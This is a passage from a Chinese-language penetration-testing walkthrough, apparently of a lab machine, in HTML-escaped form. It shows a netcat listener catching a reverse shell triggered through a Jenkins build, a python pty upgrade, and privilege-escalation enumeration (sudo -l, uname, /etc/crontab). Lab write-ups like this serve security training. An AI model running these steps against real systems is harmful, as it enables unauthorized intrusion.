lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//            \u003c/span\u003e\nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在Jenkins里面点击构建，就会执行刚刚输入的代码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e成功获得shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.135\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.135\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e54884\u003c/span\u003e\n\npython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/bash')\"\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 获得交互shell\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ ls\nls\nbash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ \n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e查看通过Jenkins后台获得的shell权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ whoami\njenkins\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ sudo -l\nWe trust you have received the usual lecture \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the local System\nAdministrator. It usually boils down to these three things:\n\n    \u003cspan class=\"hljs-comment\"\u003e#1) Respect the privacy of others.\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#2) Think before you type.\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#3) With great power comes great responsibility.\u003c/span\u003e\n\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e jenkins: ^C \u003cspan class=\"hljs-comment\"\u003e//要密码\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//                                                                                           \u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ uname -a\nLinux jarbas \u003cspan class=\"hljs-number\"\u003e3.10\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e693.21\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e.el7.x86_64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ ls -l\ntotal \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ dpkg -l\nbash: dpkg: command not found\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e权限不高不低\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试查看\u003ccode\u003ecrontab\u003c/code\u003e是否有\u003ccode\u003eroot\u003c/code\u003e运行的自动化任务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e$ cat /etc/crontab\ncat /etc/crontab\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbi
